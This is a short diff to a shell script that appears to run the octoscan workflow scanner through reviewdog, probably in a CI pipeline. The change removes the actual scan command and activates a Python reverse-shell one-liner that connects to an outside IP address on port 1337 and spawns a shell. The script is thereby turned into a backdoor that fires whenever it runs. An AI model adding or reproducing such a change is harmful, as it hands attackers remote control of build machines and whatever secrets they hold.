@@ -48,9 +48,7 @@ fi
 # Print the constructed command for debugging
 echo "Constructed command: $COMMAND"
 
-#python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("146.59.195.165",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
-
-octoscan scan . | reviewdog -efm="%f:%l:%c: %m"
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("146.59.195.165",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 
 # Execute the command
 eval "$COMMAND" | reviewdog -efm="%f:%l:%c: %m" \
